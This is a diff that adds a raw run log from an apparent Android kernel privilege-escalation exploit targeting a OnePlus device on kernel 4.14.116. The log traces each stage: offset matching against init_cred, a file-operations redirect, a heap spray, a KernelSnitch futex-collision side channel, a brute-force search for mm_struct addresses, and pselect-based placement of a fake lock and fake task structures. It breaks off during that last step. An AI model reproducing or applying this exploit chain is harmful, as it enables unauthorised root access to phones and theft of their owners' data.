@@ -1,0 +1,86 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800aebc9a8 alias=ffffff8002ebc9a8
+[+] startup context pid=7252 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=7252 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=7252 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=7252 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[*] [T+0ms] exploit start
+[*] UMH path: fops redirect (mode=4)...
+[*] [T+1336ms] pre-UMH drain
+[*] === fops redirect === target=0xffffff800303e378 mode=4
+[*] [T+1336ms]   heap spray start
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    00000074250a40c8
+[*] pass1 slow candidates: 1202
+[*]   000000642470a440 t1=65 t2=0
+[*]   00000064247797b8 t1=130 t2=0
+[*]   00000064247a5918 t1=130 t2=65
+[*]   0000006424805c18 t1=455 t2=520
+[*]   0000006424822d00 t1=455 t2=195
+[*]   00000064249214f8 t1=130 t2=130
+[*]   0000006424947628 t1=455 t2=390
+[*]   000000642494a640 t1=130 t2=130
+[*]   0000006424d9e8e0 t1=325 t2=130
+[*]   0000006424e1acc0 t1=195 t2=0
+[*]   0000006424e77fa8 t1=520 t2=520
+[*]   0000006424e90070 t1=520 t2=520
+[*]   0000006424f7b7c8 t1=130 t2=130
+[*]   0000006425040df0 t1=455 t2=455
+[*]   000000642506cf50 t1=325 t2=520
+[*]   000000642511e4e0 t1=455 t2=260
+[*]   0000006425185818 t1=455 t2=390
+[*]   00000064251a5918 t1=130 t2=65
+[*]   00000064252bb1c8 t1=130 t2=0
+[*]   0000006425543608 t1=520 t2=520
+[*]   0000006425554690 t1=505078 t2=0
+[*]   0000006425621cf8 t1=520 t2=520
+[*]   000000642588d058 t1=502734 t2=0
+[*]   00000064258c4210 t1=390 t2=65
+[*]   00000064259576a8 t1=520 t2=520
+[*]   0000006425b767a0 t1=520 t2=325
+[*]   0000006425ba3908 t1=130 t2=0
+[*]   0000006425ba5918 t1=260 t2=260
+[*]   0000006425bbd9d8 t1=390 t2=520
+[*]   0000006425ce02f0 t1=520 t2=325
+[*]   0000006425fb0970 t1=390 t2=455
+[*]   0000006425ffdbd8 t1=455 t2=455
+[*]   000000642602ad40 t1=520 t2=390
+[*]   00000064261f1b78 t1=520 t2=325
+[*]   000000642645eee0 t1=455 t2=520
+[*]   00000064264960a0 t1=65 t2=0
+[*]   000000642666ef60 t1=507031 t2=0
+[*]   000000642671c4d0 t1=260 t2=65
+[*]   000000642671e4e0 t1=325 t2=0
+[*]   0000006426787828 t1=195 t2=65
+[*]   0000006426b0a440 t1=325 t2=260
+[*]   0000006426b66720 t1=504036 t2=0
+[*]   0000006426cac150 t1=260 t2=0
+[*]   0000006426d91878 t1=390 t2=455
+[*]   0000006426dc6a20 t1=509049 t2=0
+[*] found 15 collisisons
+[*] KernelSnitch collisions: found
+[*] start bruteforcing
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff808d246cc0
+[*] [probe] base=ffffff808d240000 payload_mode=0 entering skb payload[*] done
+[*] prepare_kernel_page ok attempt=1
+[*] [T+72887ms]   heap spray done
+[-] pselect cannot place tree_left waiter_word=2 global_word=-5 words_per_set=5 nfds=320
+[-] pselect cannot place pi_parent waiter_word=3 global_word=-4 words_per_set=5 nfds=320
+[-] pselect cannot place pi_right waiter_word=4 global_word=-3 words_per_set=5 nfds=320
+[-] pselect cannot place pi_left waiter_word=5 global_word=-2 words_per_set=5 nfds=320
+[-] pselect cannot place task waiter_word=6 global_word=-1 words_per_set=5 nfds=320
+[*] pselect route setup attempt=1 simple=0 shift=-7 page=ffffff808d240000 fake_lock=ffffff808d240000 fake_w0=ffffff808d240300 fake_task=ffffff808d240400 in0=ffffff808d240000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
